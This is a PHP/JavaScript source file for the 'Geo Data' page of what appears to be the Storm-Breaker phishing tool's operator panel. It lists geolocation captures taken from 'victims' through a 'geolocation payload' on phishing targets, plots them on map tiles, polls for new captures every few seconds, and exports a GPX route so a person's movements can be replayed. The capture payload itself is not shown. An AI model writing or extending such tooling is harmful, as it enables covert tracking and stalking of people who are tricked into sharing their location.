<?php
/**
 * route-geo.php — UI for the "Geo Data" sidebar route.
 *
 * Lists every captured geolocation event across every target. The
 * design system gives us .geo-grid + .geo-card with a built-in radar
 * mini-map; we anchor the pin's screen position to the longitude/lat
 * mod 1 so different coordinates land at different spots on the radar
 * (purely cosmetic — the real precision is in the readout below).
 *
 * Caller (panel.php) is responsible for auth.
 */
?>
<section class="geo-section">

  <div class="geo-toolbar">
    <div class="geo-stats">
      <span class="badge badge-cyan" id="geo-stat-total"><span class="badge-dot cyan pulse"></span>0 PINGS</span>
      <span class="badge badge-green" id="geo-stat-new"   hidden>0 NEW</span>
      <span class="badge badge-muted" id="geo-stat-sources">0 SOURCES</span>
    </div>
    <div class="geo-actions-bar">
      <button type="button" class="btn btn-sm btn-outline" id="geo-export">
        <svg class="icon icon-sm"><use href="#i-download"/></svg> Export GPX
      </button>
      <button type="button" class="btn btn-sm btn-outline" id="geo-refresh">
        <svg class="icon icon-sm"><use href="#i-refresh"/></svg> Refresh
      </button>
    </div>
  </div>

  <div class="geo-grid" id="geo-grid"></div>

  <div class="geo-empty" id="geo-empty" hidden>
    <svg class="icon icon-xl"><use href="#i-map-pin"/></svg>
    <div class="geo-empty-title">No geolocation pings yet</div>
    <div class="geo-empty-sub">// enable the <code>geolocation</code> payload on a target — coordinates appear once a victim grants access</div>
  </div>

</section>

<!-- Geo card template. -->
<template id="geo-card-tpl">
  <div class="geo-card">
    <div class="geo-map g-map">
      <div class="geo-radar g-radar"></div>
      <div class="geo-pin g-pin"><svg><use href="#i-map-pin"/></svg></div>
      <div class="geo-coords g-coords"></div>
      <div class="geo-acc g-acc"></div>
    </div>
    <div class="geo-body">
      <div class="geo-row"><span class="geo-key">TARGET</span><span class="geo-value cyan g-target"></span></div>
      <div class="geo-row"><span class="geo-key">CAPTURED</span><span class="geo-value g-captured"></span></div>
      <div class="geo-row"><span class="geo-key">ACCURACY</span><span class="geo-value g-accuracy"></span></div>
      <div class="geo-row"><span class="geo-key">ALTITUDE</span><span class="geo-value g-altitude"></span></div>
      <div class="geo-row"><span class="geo-key">SPEED</span><span class="geo-value g-speed"></span></div>
    </div>
    <div class="geo-footer">
      <a class="btn btn-sm btn-outline g-maps" target="_blank" rel="noopener">
        <svg class="icon icon-sm"><use href="#i-external-link"/></svg> Open in Maps
      </a>
      <button type="button" class="btn btn-sm btn-ghost g-copy">
        <svg class="icon icon-sm"><use href="#i-copy"/></svg> Copy
      </button>
      <span style="flex:1"></span>
      <button type="button" class="btn btn-sm btn-ghost danger g-delete">
        <svg class="icon icon-sm"><use href="#i-trash"/></svg>
      </button>
    </div>
  </div>
</template>

<script>
/* ── Geo route ────────────────────────────────────────────────── */
(function () {
  const API           = 'api/geo.php';
  const GEO_POLL_MS   = 5000;
  const NEW_WINDOW_SEC = 5 * 60;

  const $grid   = document.getElementById('geo-grid');
  const $empty  = document.getElementById('geo-empty');
  const $tpl    = document.getElementById('geo-card-tpl');
  const $bTotal = document.getElementById('geo-stat-total');
  const $bNew   = document.getElementById('geo-stat-new');
  const $bSrc   = document.getElementById('geo-stat-sources');
  const $btnRefresh = document.getElementById('geo-refresh');
  const $btnExport  = document.getElementById('geo-export');

  function relTime(unix) {
    const diff = Math.max(0, Math.floor(Date.now()/1000) - unix);
    if (diff < 60)    return diff + 's ago';
    if (diff < 3600)  return Math.floor(diff/60) + 'm ago';
    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
    return Math.floor(diff/86400) + 'd ago';
  }
  function fmtLatLon(lat, lon) {
    const ns = lat >= 0 ? 'N' : 'S';
    const ew = lon >= 0 ? 'E' : 'W';
    return Math.abs(lat).toFixed(4) + '° ' + ns + ', ' + Math.abs(lon).toFixed(4) + '° ' + ew;
  }
  function accuracyTier(m) {
    if (m == null)      return { label: '—',                    cls: 'muted' };
    if (m <= 20)        return { label: 'High ('   + Math.round(m) + 'm)', cls: 'green' };
    if (m <= 100)       return { label: 'Medium (' + Math.round(m) + 'm)', cls: 'amber' };
    return                       { label: 'Low ('    + Math.round(m) + 'm)', cls: 'red'   };
  }

  let lastIdsLen = 0;
  let cachedItems = [];

  function loadMapTiles(mapEl, lat, lon) {
    const zoom = 13;
    const n = Math.pow(2, zoom);
    const latRad = lat * Math.PI / 180;
    const txf = (lon + 180) / 360 * n;
    const tyf = (1 - Math.log(Math.tan(latRad) + 1 / Math.cos(latRad)) / Math.PI) / 2 * n;
    const tx = Math.floor(txf), ty = Math.floor(tyf);
    const ox = (txf - tx) * 256, oy = (tyf - ty) * 256;

    const wrap = document.createElement('div');
    wrap.className = 'geo-tiles';
    for (let dy = -1; dy <= 1; dy++) {
      for (let dx = -1; dx <= 1; dx++) {
        const img = new Image();
        img.src = 'https://tile.openstreetmap.org/' + zoom + '/' + (tx+dx) + '/' + (ty+dy) + '.png';
        img.style.cssText = 'position:absolute;width:256px;height:256px;left:'+(dx+1)*256+'px;top:'+(dy+1)*256+'px';
        img.loading = 'lazy';
        img.alt = '';
        wrap.appendChild(img);
      }
    }
    const mapW = mapEl.clientWidth || 320;
    wrap.style.left = Math.round(mapW / 2 - 256 - ox) + 'px';
    wrap.style.top  = Math.round(80 - 256 - oy) + 'px';
    mapEl.insertBefore(wrap, mapEl.firstChild);
    mapEl.querySelector('.g-radar')?.remove();
  }

  function render(payload) {
    const items = payload.items || [];
    cachedItems = items;
    const newCount = items.filter(it => (Date.now()/1000 - it.ts) <= NEW_WINDOW_SEC).length;

    $bTotal.innerHTML = '<span class="badge-dot cyan pulse"></span>' + items.length + ' PINGS';
    $bSrc.textContent = (payload.sources || 0) + ' SOURCES';
    if (newCount > 0) { $bNew.hidden = false; $bNew.textContent = newCount + ' NEW'; }
    else              { $bNew.hidden = true; }

    $btnExport.disabled = (payload.with_coords || 0) === 0;

    if (items.length === 0) {
      $grid.innerHTML = '';
      $empty.hidden = false;
      lastIdsLen = 0;
      return;
    }
    $empty.hidden = true;

    const sig = items.length + ':' + (items[0]?.id || '');
    if ($grid.dataset.sig === sig) return;
    $grid.dataset.sig = sig;

    $grid.innerHTML = '';
    items.forEach(it => {
      const node = $tpl.content.firstElementChild.cloneNode(true);
      const denied = it.error != null;

      const map = node.querySelector('.g-map');
      const pin = node.querySelector('.g-pin');
      if (it.lat != null && it.lon != null) {
        pin.style.left = '50%';
        pin.style.top  = '50%';
        loadMapTiles(map, it.lat, it.lon);
      }
      if (denied) {
        // Denied pings get a red pin with no coords; still useful as a
        // record that the page was visited.
        pin.style.color  = 'var(--accent-red)';
        pin.style.filter = 'drop-shadow(0 0 8px var(--accent-red-glow,rgba(255,45,85,.4)))';
      }

      const coordsEl = node.querySelector('.g-coords');
      const accEl    = node.querySelector('.g-acc');
      if (it.lat != null && it.lon != null) {
        coordsEl.textContent = fmtLatLon(it.lat, it.lon);
        accEl.textContent    = it.accuracy_m != null ? '±' + Math.round(it.accuracy_m) + 'm' : '';
      } else {
        coordsEl.textContent = denied ? 'PERMISSION DENIED' : '— no fix —';
        coordsEl.style.color = 'var(--accent-red)';
        coordsEl.style.borderColor = 'rgba(255,45,85,.30)';
        accEl.textContent = '';
      }

      node.querySelector('.g-target').textContent = '/' + it.target;
      node.querySelector('.g-captured').textContent =
        relTime(it.ts) + ' · ' + new Date(it.ts*1000).toISOString().slice(0,19).replace('T',' ') + ' UTC';

      const tier = accuracyTier(it.accuracy_m);
      const accValEl = node.querySelector('.g-accuracy');
      accValEl.textContent = denied ? 'denied' : tier.label;
      accValEl.classList.add(tier.cls);

      node.querySelector('.g-altitude').textContent =
        it.altitude != null ? Math.round(it.altitude) + ' m' : '—';
      node.querySelector('.g-speed').textContent =
        it.speed    != null ? (it.speed * 3.6).toFixed(1) + ' km/h' : '—';

      const maps = node.querySelector('.g-maps');
      if (it.lat != null && it.lon != null) {
        maps.href = 'https://www.google.com/maps?q=' + it.lat + ',' + it.lon;
      } else {
        maps.classList.add('btn-disabled');
        maps.removeAttribute('href');
      }
      node.querySelector('.g-copy').addEventListener('click', () => {
        if (it.lat != null && it.lon != null) copyToClipboard(it.lat + ', ' + it.lon);
        else fireToast('error', 'NO COORDINATES', 'Nothing to copy.');
      });
      node.querySelector('.g-delete').addEventListener('click', () => deletePing(it));

      $grid.appendChild(node);
    });

    if (lastIdsLen && items.length > lastIdsLen && typeof fireToast === 'function') {
      fireToast('success', 'NEW GEO PING', (items.length - lastIdsLen) + ' new geolocation ping(s)');
    }
    lastIdsLen = items.length;
  }

  /* Same fallback dance as the targets page so this works on plain HTTP
     LAN deployments where the modern Clipboard API would silently fail. */
  function copyToClipboard(text) {
    const announce = ok => fireToast(ok ? 'success' : 'error', ok ? 'COPIED' : 'COPY FAILED', ok ? text : 'Clipboard not available.');
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(text).then(() => announce(true), () => announce(false));
      return;
    }
    const ta = document.createElement('textarea');
    ta.value = text; ta.setAttribute('readonly','');
    ta.style.cssText = 'position:fixed;top:0;left:-9999px;opacity:0';
    document.body.appendChild(ta); ta.select();
    let ok = false; try { ok = document.execCommand('copy'); } catch (_) {}
    document.body.removeChild(ta);
    announce(ok);
  }

  async function deletePing(it) {
    if (!confirm('Delete this geo ping? This cannot be undone.')) return;
    try {
      const fd = new FormData();
      fd.append('action', 'delete');
      fd.append('slug', it.target);
      fd.append('id',   it.id);
      const res  = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'delete failed');
      if (typeof fireToast === 'function') fireToast('success', 'PING DELETED', '/' + it.target);
      load(false);
    } catch (e) {
      if (typeof fireToast === 'function') fireToast('error', 'DELETE FAILED', e.message);
    }
  }

  /* GPX export — assemble a route on the client from the pings that have
     real coordinates. Useful for replaying a target's movement in any GPS
     viewer. Skips denied / no-fix entries. */
  function exportGpx() {
    const pts = cachedItems.filter(i => i.lat != null && i.lon != null);
    if (!pts.length) {
      fireToast('error', 'NOTHING TO EXPORT', 'No pings with coordinates.');
      return;
    }
    const xml =
`<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Storm-Breaker" xmlns="http://www.topografix.com/GPX/1/1">
${pts.map(p => `  <wpt lat="${p.lat}" lon="${p.lon}">
    <time>${new Date(p.ts*1000).toISOString()}</time>
    <name>/${p.target}</name>
    <desc>captured ${relTime(p.ts)}${p.accuracy_m != null ? ' · ±' + Math.round(p.accuracy_m) + 'm' : ''}</desc>
  </wpt>`).join('\n')}
</gpx>`;
    const blob = new Blob([xml], { type: 'application/gpx+xml' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url;
    a.download = 'storm-breaker-geo-' + new Date().toISOString().replace(/[:.]/g,'-').slice(0,19) + '.gpx';
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
    fireToast('success', 'GPX EXPORTED', pts.length + ' waypoint(s)');
  }
  $btnExport.addEventListener('click', exportGpx);

  async function load(showError) {
    try {
      const res  = await fetch(API, { credentials: 'same-origin', cache: 'no-store' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'request failed');
      render(json);
    } catch (e) {
      if (showError && typeof fireToast === 'function') fireToast('error', 'LOAD FAILED', e.message);
    }
  }
  $btnRefresh.addEventListener('click', () => load(true));

  let pollTimer = null;
  function startPoll() { stopPoll(); pollTimer = setInterval(() => load(false), GEO_POLL_MS); }
  function stopPoll()  { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) stopPoll();
    else { load(false); startPoll(); }
  });

  load(false).then(startPoll);
})();
</script>

<style>
.geo-section { display: flex; flex-direction: column; gap: var(--space-4); }
.geo-toolbar {
  display: flex; align-items: center; justify-content: space-between;
  flex-wrap: wrap; gap: var(--space-3);
}
.geo-stats        { display: flex; gap: var(--space-2); flex-wrap: wrap; }
.geo-actions-bar  { display: flex; gap: var(--space-2); flex-wrap: wrap; }

/* The design system gives the radar a fixed pin in the centre. We move
   it per-card so different coordinates land in different spots — purely
   visual, real coords are in the readouts below. */
.geo-pin { position: absolute; pointer-events: none; transition: left .3s, top .3s; }
.geo-tiles {
  position: absolute; width: 768px; height: 768px;
  pointer-events: none; z-index: 0; opacity: .75;
  filter: invert(1) hue-rotate(180deg) brightness(.65) contrast(1.3);
}

.geo-empty[hidden] { display: none !important; }
.geo-empty {
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  text-align: center;
  padding: var(--space-7) var(--space-4);
  background: var(--bg-surface);
  border: 1px dashed var(--border-subtle);
  border-radius: var(--radius-lg);
  color: var(--text-muted);
  gap: var(--space-2);
}
.geo-empty .icon { color: var(--text-muted); width: 36px; height: 36px; }
.geo-empty-title {
  font-family: var(--font-mono); font-size: var(--text-sm); font-weight: 600;
  color: var(--text-secondary); letter-spacing: .04em;
}
.geo-empty-sub  { font-family: var(--font-mono); font-size: var(--text-xs); }
.geo-empty-sub code {
  background: var(--bg-overlay);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 1px 5px;
  color: var(--text-code);
}

.btn-disabled {
  pointer-events: none; opacity: .5;
}
</style>
